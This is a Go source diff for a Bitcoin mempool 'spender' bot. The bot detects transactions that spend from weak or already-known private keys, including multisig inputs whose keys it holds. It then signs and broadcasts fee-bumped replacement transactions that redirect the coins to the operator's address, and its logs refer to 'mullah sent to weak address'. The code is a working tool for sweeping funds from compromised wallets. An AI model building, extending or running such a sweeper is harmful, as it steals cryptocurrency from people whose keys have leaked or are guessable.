@@ -3,6 +3,7 @@ package memspender
 import (
 	"bytes"
 	"context"
+	"fmt"
 	"github.com/btcsuite/btcd/btcutil"
 	"github.com/btcsuite/btcd/chaincfg"
 	"github.com/btcsuite/btcd/chaincfg/chainhash"
@@ -24,6 +25,7 @@ import (
 type secretStore interface {
 	txauthor.SecretsSource
 	HasAddress(address btcutil.Address) (bool, error)
+	HasKey(key []byte) (bool, error)
 	HasKnownCompressedKey(key []byte) (bool, error)
 }
 
@@ -31,12 +33,14 @@ type Spender struct {
 	txChan          <-chan *wire.MsgTx
 	addressToSendTo string
 	addressScript   []byte
+	address         btcutil.Address
 	skipped         int64
 	publisher       *broadcaster.Broker[*string]
 	cfg             *chaincfg.Params
 	logger          *zap.Logger
 	cli             *mempoolspace.Rest
 	txCache         *expirable.LRU[chainhash.Hash, TxInfo]
+	enableReplay    bool
 
 	secretStore secretStore
 
@@ -72,6 +76,7 @@ func New(channel chan *wire.MsgTx, isTestNet bool, publisher *broadcaster.Broker
 		txCache:         expirable.NewLRU[chainhash.Hash, TxInfo](5000, nil, 5*time.Minute),
 		addressToSendTo: address,
 		addressScript:   addressScript,
+		address:         decodedAddress,
 		publisher:       publisher,
 		cfg:             params,
 		logger:          logger,
@@ -156,14 +161,15 @@ func (s *Spender) SpendAddress(ctx context.Context, address string) error {
 		return err
 	}
 
+	return s.spendSignedTx(tx)
+}
+
+func (s *Spender) spendSignedTx(tx *wire.MsgTx) error {
 	encodedTx := txhelper.ToStringPTR(tx)
 	if encodedTx == nil {
 		return errors.New("error encoding transaction")
 	}
 	s.publisher.Publish(encodedTx)
-
-	_ = transactions
-
 	return nil
 }
 
@@ -234,9 +240,10 @@ func (s *Spender) Start(ctx context.Context) {
 const minSats = 800
 
 func (s *Spender) onTx(ctx context.Context, tx *wire.MsgTx) {
+	field := zap.String("txid", tx.TxHash().String())
 	defer func() {
 		if r := recover(); r != nil {
-			s.logger.Error("ruh oh a panic occurred", zap.String("txid", tx.TxHash().String()))
+			s.logger.Error("ruh oh a panic occurred", field)
 		}
 	}()
 
@@ -249,13 +256,16 @@ func (s *Spender) onTx(ctx context.Context, tx *wire.MsgTx) {
 		go func() {
 			// wait a few seconds for message to propagate
 			// as if we act too quickly nodes might not have the data
-			time.Sleep(10 * time.Second)
-			s.logger.Info("mullah sent to weak address")
+			time.Sleep(3 * time.Second)
+			//s.logger.Info("mullah sent to weak address")
 			s.spendWeakKey(ctx, tx)
 		}()
 	case SpentKnownKey:
-		s.logger.Info("replacing weak spend")
+		//s.logger.Info("replacing weak spend")
 		s.spendKnownKey(ctx, tx)
+	case SpentKnownMultiSig:
+		s.logger.Info("weak multisig spend detected", field)
+		s.spendKnownMultiSig(ctx, tx)
 	default:
 		atomic.AddInt64(&s.skipped, 1)
 	}
@@ -301,7 +311,7 @@ func (s *Spender) spendKnownKey(ctx context.Context, tx *wire.MsgTx) {
 		originalInputValue += outpoint.Value
 
 		parsed := NewParsedScript(in.SignatureScript, in.Witness...)
-		if !(parsed.IsP2PKH() || parsed.IsP2WPKH() || parsed.IsSegwitMultiSig()) {
+		if !(parsed.IsP2PKH() || parsed.IsP2WPKH() || parsed.IsMultiSig()) {
 			continue
 		}
 		key, _ := parsed.PublicKeyRaw()
@@ -367,15 +377,90 @@ func (s *Spender) spendKnownKey(ctx context.Context, tx *wire.MsgTx) {
 		return
 	}
 
-	encodedTx := txhelper.ToStringPTR(newTx)
-	if encodedTx == nil {
-		s.logger.Warn("error encoding transaction")
-		return
-	}
+	s.spendSignedTx(newTx)
 	s.logger.Info("replacing weak spend",
 		zap.String("weak_tx_id", tx.TxHash().String()),
-		zap.String("tx", *encodedTx))
-	s.publisher.Publish(encodedTx)
+		zap.String("tx_id", newTx.TxHash().String()))
+
+}
+
+func (s *Spender) spendKnownMultiSig(ctx context.Context, spentTx *wire.MsgTx) {
+	var amounts []btcutil.Amount
+	var prevPKScripts [][]byte
+	var totalValue int64
+	tx := wire.NewMsgTx(wire.TxVersion)
+
+	var originalValue int64
+
+	for _, out := range spentTx.TxOut {
+		originalValue += out.Value
+	}
+
+	for _, in := range spentTx.TxIn {
+		found, info := s.hasMultiSig(in)
+		if found {
+			inputTx := s.getTx(ctx, in.PreviousOutPoint.Hash)
+			idx := int(in.PreviousOutPoint.Index)
+			if inputTx == nil || len(inputTx.TxOut) < idx {
+				return
+			}
+
+			out := inputTx.TxOut[idx]
+
+			totalValue += out.Value
+			prevPKScripts = append(prevPKScripts, out.PkScript)
+			amounts = append(amounts, btcutil.Amount(out.Value))
+
+			in := wire.NewTxIn(wire.NewOutPoint(&in.PreviousOutPoint.Hash, uint32(idx)), nil, nil)
+			in.Sequence = 0xffffffff - 2
+			in.SignatureScript = info.Data[len(info.Data)-1]
+			tx.AddTxIn(in)
+		}
+	}
+
+	if totalValue == 0 {
+		return
+	}
+
+	if len(tx.TxIn) == len(spentTx.TxIn) && originalValue < totalValue {
+		totalValue = originalValue // int64(float64(originalValue) * .999)
+	} else {
+		totalValue = int64(float64(totalValue) * .8)
+	}
+
+	const bumpFee = 5
+	totalValue -= int64(txhelper.VBytes(tx) * bumpFee * 2)
+
+	out := wire.NewTxOut(totalValue, s.addressScript)
+	tx.AddTxOut(out)
+
+	info := SignerOpts{IsMultiSig: true}
+
+pkLoop:
+	for _, pkScript := range prevPKScripts {
+		_, addresses, _, _ := txscript.ExtractPkScriptAddrs(pkScript, s.cfg)
+
+		for _, address := range addresses {
+			switch address.(type) {
+			case *btcutil.AddressWitnessPubKeyHash, *btcutil.AddressWitnessScriptHash, *btcutil.AddressTaproot:
+				info.UseWitness = true
+				break pkLoop
+			}
+		}
+
+	}
+
+	if err := SignTx(tx, prevPKScripts, amounts, s.secretStore, info); err != nil {
+		return
+	}
+
+	if err := s.spendSignedTx(tx); err == nil {
+		s.logger.Info("spending known multisig",
+			zap.String("original_tx_id", spentTx.TxHash().String()),
+			zap.String("tx_id", tx.TxHash().String()),
+		)
+	}
+
 }
 
 func (s *Spender) calcSize(tx *wire.MsgTx, prevPKScripts [][]byte, amounts []btcutil.Amount) (float64, error) {
@@ -414,15 +499,15 @@ func (s *Spender) spendInput(ctx context.Context, input *wire.TxIn, val int64, o
 
 	tx.AddTxOut(wire.NewTxOut(val, s.addressScript))
 
-	encodedTx := txhelper.ToStringPTR(tx)
-	if encodedTx == nil {
-		s.logger.Warn("error encoding transaction")
-		return
+	if err := s.spendSignedTx(tx); err == nil {
+		s.logger.Info("sending transaction",
+			zap.String("original_tx_id", originalTx.TxHash().String()),
+			zap.String("tx_id", tx.TxHash().String()))
 	}
-	s.logger.Info("sending transaction",
-		zap.String("original_tx_id", originalTx.TxHash().String()),
-		zap.String("tx", *encodedTx))
-	s.publisher.Publish(encodedTx)
+}
+
+func (s *Spender) hasMultiSig(in *wire.TxIn) (bool, ParsedScript) {
+	return hasMultiSigKeys(in, s.secretStore)
 }
 
 func (s *Spender) spendWeakKey(ctx context.Context, weakTx *wire.MsgTx) {
@@ -500,16 +585,11 @@ outLoop:
 		return
 	}
 
-	encodedTx := txhelper.ToStringPTR(tx)
-	if encodedTx == nil {
-		s.logger.Warn("error encoding transaction")
-		return
+	if err := s.spendSignedTx(tx); err == nil {
+		s.logger.Info("replacing weak transaction",
+			zap.String("weak_tx_id", weakTx.TxHash().String()),
+			zap.String("tx_id", tx.TxHash().String()))
 	}
-	s.logger.Info("replacing weak transaction",
-		zap.String("weak_tx_id", weakTx.TxHash().String()),
-		zap.String("tx", *encodedTx))
-	s.publisher.Publish(encodedTx)
-
 }
 
 // classifyTx will attempt to classify a transaction determining if it is spendable or not
@@ -535,6 +615,15 @@ func (s *Spender) classifyTx(tx *wire.MsgTx) TxClassification {
 	for _, out := range tx.TxOut {
 		_, add, _, _ := txscript.ExtractPkScriptAddrs(out.PkScript, s.cfg)
 		if len(add) > 0 {
+			for _, address := range add {
+				encoded := address.EncodeAddress()
+				if encoded == "2MuFU6ZyBLtDNadMA6RnwJdXGWUSUaoKLeS" {
+					_ = fmt.Println
+				}
+				if address.EncodeAddress() == s.addressToSendTo {
+					return UnSpendable
+				}
+			}
 			addresses = append(addresses, add...)
 		}
 	}
@@ -550,44 +639,19 @@ func (s *Spender) classifyTx(tx *wire.MsgTx) TxClassification {
 		return UnSpendable
 	}
 
-	if len(addresses) > 0 && addresses[0].EncodeAddress() == s.addressToSendTo {
-		// TODO: we should short circuit here .. uncomment for testing our response
-		//_ = fmt.Println
-		return UnSpendable
-	}
-
 	for _, in := range tx.TxIn {
 		parsed := NewParsedScript(in.SignatureScript, in.Witness...)
 		key, _ := parsed.PublicKeyRaw()
-		if key != nil && len(key) == 33 {
-			if len(key) != 33 {
-				continue
-			}
-			found, _ := s.secretStore.HasKnownCompressedKey(key)
+		if key != nil {
+			found, _ := s.secretStore.HasKey(key)
 			if found {
 				return SpentKnownKey
 			}
 			continue
 		}
 
-		keys, minKeys, _ := parsed.MultiSigKeysRaw()
-		if len(keys) == 0 {
-			continue
-		}
-
-		var known int
-		for _, k := range keys {
-			if len(k) != 33 {
-				continue
-			}
-			found, _ := s.secretStore.HasKnownCompressedKey(k)
-			if found {
-				known++
-			}
-		}
-
-		if known >= minKeys {
-			return SpentKnownKey
+		if found, _ := hasParsedMultiSigKeys(in, parsed, s.secretStore); found {
+			return SpentKnownMultiSig
 		}
 
 	}
@@ -599,7 +663,7 @@ func (s *Spender) classifyTx(tx *wire.MsgTx) TxClassification {
 		}
 	}
 
-	if len(tx.TxIn) == 1 && len(tx.TxOut) == 1 && (len(tx.TxIn[0].SignatureScript) > 0 || len(tx.TxIn[0].Witness) > 0) {
+	if s.enableReplay && len(tx.TxIn) == 1 && len(tx.TxOut) == 1 && (len(tx.TxIn[0].SignatureScript) > 0 || len(tx.TxIn[0].Witness) > 0) {
 		valid := isReplayable(tx.TxIn[0].SignatureScript, tx.TxIn[0].Witness...) && err == nil &&
 			len(addresses) == 1
 
@@ -725,6 +789,29 @@ redeemStep:
 	return len(redeemScript) > 0
 }
 
+func hasMultiSigKeys(in *wire.TxIn, store secretStore) (isMultiSig bool, script ParsedScript) {
+	parsed := NewParsedScript(in.SignatureScript, in.Witness...)
+	return hasParsedMultiSigKeys(in, parsed, store)
+}
+
+func hasParsedMultiSigKeys(in *wire.TxIn, parsed ParsedScript, store secretStore) (bool, ParsedScript) {
+	keys, minKeys, _ := parsed.MultiSigKeysRaw()
+	if len(keys) == 0 {
+		return false, parsed
+	}
+
+	var known int
+	for _, k := range keys {
+		found, _ := store.HasKey(k)
+		if found {
+			known++
+		}
+	}
+
+	// TODO: axe the witness check?
+	return known >= minKeys && len(in.Witness) == 0, parsed
+}
+
 type TxClassification int
 
 func (t TxClassification) String() string {
@@ -738,6 +825,8 @@ func (t TxClassification) String() string {
 		val = "WeakKey"
 	case SpentKnownKey:
 		val = "SpentKnownKey"
+	case SpentKnownMultiSig:
+		val = "SpentKnownMultiSig"
 	}
 
 	return val
@@ -748,4 +837,5 @@ const (
 	ReplayableSimpleInput
 	WeakKey
 	SpentKnownKey
+	SpentKnownMultiSig
 )
